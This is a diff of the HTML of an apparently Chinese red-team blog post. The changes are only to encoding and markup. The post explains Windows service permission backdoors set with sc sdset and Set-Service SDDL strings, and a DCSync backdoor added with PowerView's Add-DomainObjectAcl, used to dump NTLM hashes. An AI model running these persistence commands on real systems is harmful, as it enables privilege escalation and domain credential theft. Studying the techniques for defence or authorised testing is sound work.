@@ -333,13 +333,13 @@ ntdll!_SECURITY_DESCRIPTOR
 <h3 id="powershell更改服务权限">Powershell更改服务权限</h3>
 <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.1">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.1</a></p>
 <p>使用Powershell修改服务的权限可以使用Set-Service：</p>
-<pre tabindex="0"><code>$SDDL = &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;SU)&quot;
-Set-Service -Name &quot;BITS&quot; -SecurityDescriptorSddl $SDDL
+<pre tabindex="0"><code>$SDDL = &#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;SU)&#34;
+Set-Service -Name &#34;BITS&#34; -SecurityDescriptorSddl $SDDL
 </code></pre><h3 id="cmd修改服务权限">CMD修改服务权限</h3>
 <p>想象一个场景，如果随时都拥有一个服务器的权限，但是不能长时间登录某个特权账户，那么可以留置一个任意用户可以修改的系统服务，方便随时提权。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ac1169be-4f5f-11ec-98c9-00d861bf4abb.png" alt="2021-01-31-22-27-28"></p>
 <pre tabindex="0"><code>sc setsd &lt;Service Name&gt; &lt;SDDL String&gt;
-sc sdset defragsvc &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)&quot;
+sc sdset defragsvc &#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)&#34;
 </code></pre><h2 id="0x11-windows域下的dcsync攻击及后门实现">0x11 Windows域下的DCSync攻击及后门实现</h2>
 <p>DCSync是域控之间同步域数据的一个传递方式，一旦攻击者获取了具有域复制权限的特权帐户，攻击者就可以利用复制协议来模仿域控制器，诱使域控制器将域用户相关的数据发送出来。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ac48005a-4f5f-11ec-be47-00d861bf4abb.png" alt="2021-01-31-22-28-23"></p>
@@ -390,8 +390,8 @@ sc sdset defragsvc &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDR
 <p>通过调用活动目录自身独有的COM组件接口，可以获取域对象的安全描述符，修改方式与本地修改ACL没有太多差别。</p>
 <p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270">Powerview</a>实现了Powershell版本的DCSync后门植入：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/acece174-4f5f-11ec-991c-00d861bf4abb.png" alt="2021-01-31-22-30-43"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">Add<span style="color:#f92672">-</span>DomainObjectAcl <span style="color:#f92672">-</span>TargetIdentity <span style="color:#e6db74">&#34;DC=Domain,DC=com&#34;</span> <span style="color:#f92672">-</span>PrincipalIdentity <span style="color:#f92672">&lt;</span>UserName<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>Rights DCSync <span style="color:#f92672">-</span>Verbose
-</code></pre></div><p>我这里实现了一个C++版本的：<a href="https://github.com/Rvn0xsy/PDacl">https://github.com/Rvn0xsy/PDacl</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>Add<span style="color:#f92672">-</span>DomainObjectAcl <span style="color:#f92672">-</span>TargetIdentity <span style="color:#e6db74">&#34;DC=Domain,DC=com&#34;</span> <span style="color:#f92672">-</span>PrincipalIdentity <span style="color:#f92672">&lt;</span>UserName<span style="color:#f92672">&gt;</span> <span style="color:#f92672">-</span>Rights DCSync <span style="color:#f92672">-</span>Verbose
+</span></span></code></pre></div><p>我这里实现了一个C++版本的：<a href="https://github.com/Rvn0xsy/PDacl">https://github.com/Rvn0xsy/PDacl</a></p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ad26d0be-4f5f-11ec-aa64-00d861bf4abb.png" alt="2021-01-31-22-33-32"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/ad79864c-4f5f-11ec-90cc-00d861bf4abb.png" alt="2021-01-31-22-33-58"></p>
 <p>在Cobalt Strike中以普通用户权限转储NTLM验证成功：</p>
